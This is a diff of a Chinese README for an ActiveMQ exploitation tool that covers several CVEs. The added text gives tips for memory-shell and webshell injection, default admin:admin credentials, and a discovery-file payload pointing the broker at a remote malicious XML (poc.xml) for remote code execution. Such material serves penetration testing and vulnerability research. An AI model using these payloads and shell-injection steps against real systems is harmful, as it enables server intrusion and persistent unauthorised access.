@@ -1,6 +1,6 @@
 # ActiveMQ-EXPtools
 
-支持检测和利用Apache ActiveMQ漏洞，CVE-2015-5254，CVE-2016-3088，CVE-2022-41678，CVE-2023-46604，CVE-2024-32114，CVE-2026-34197
+支持检测和利用Apache ActiveMQ漏洞，CVE-2015-5254，CVE-2016-3088，CVE-2022-41678，CVE-2023-46604，CVE-2024-32114，CVE-2026-34197，CVE-2026-40466
 
 ![image-20260420111234916](./images/1.png)
 
@@ -9,9 +9,7 @@
 
 jdk8启动，Openwire默认端口61616，有时目标环境可能没有开放。apache activemq默认用户名密码admin:admin。BeanXML设置面板可生成执行对应命令的恶意的xml。有问题欢迎提Issue。
 
-CVE-2023-46604和CVE-2026-34197在漏洞检测时就会发送exp，注意查看BeanXML服务端是否收到请求。
-
-![image-20260422153823469](./images/3.png)
+漏洞检测时可以将恶意XML服务器地址设置为dnslog，若收到请求，说明可能存在CVE-2023-46604，CVE-2026-34197，CVE-2026-40466
 
 ## 部分漏洞利用注意事项
 
@@ -31,9 +29,13 @@ java-chains生成反序列化数据，验证漏洞时可以用URLDNS
 
 自定义webshell写入时，冰蝎马写入会报500，哥斯拉正常。工具连接时注意要加上认证头部
 
-### CVE-2026-34197
+### CVE-2026-34197/CVE-2026-40466
 
-1.2版本集成了jmg，增加了内存马注入功能。当前版本的jmg在生成jetty中间件，组件类型为jakarta时，会出现报错，稍微修改了一下源码。
+1.3版本改为集成MemShellParty，该项目对jetty内存马支持更好，CVE-2026-34197/CVE-2026-40466均支持内存马注入，注意CVE-2026-40466漏洞无法支持Jakarta_handler挂载类型，且只有Godzilla支持Jakarta_handler。
+
+Filter，Listener或Servlet类型需要加上路径/admin/\*，/admin/index，/api/\*，/api/index，以及认证头部
+
+CVE-2026-40466利用时注意还需要创建/discovery-registry/default文件，内容为`vm://evil?brokerConfig=xbean:http://192.168.239.129:8081/poc.xml`
 
 **致谢**
 
@@ -41,6 +43,6 @@ https://github.com/URJACK2025/CVE-2022-41678
 
 https://github.com/vulhub/vulhub
 
-https://github.com/vulhub/java-chains
+https://github.com/ReaJason/MemShellParty
 
-https://github.com/pen4uin/java-memshell-generator
+https://github.com/1diot9/MyJavaSecStudy/blob/5504868a7cba4bf674fe6974fe8f613e556e5d42/Apache/ActiveMQ/CVE-2026-40466/poc/CVE-2026-40466_HTTP_Discovery_RCE_Analysis.md
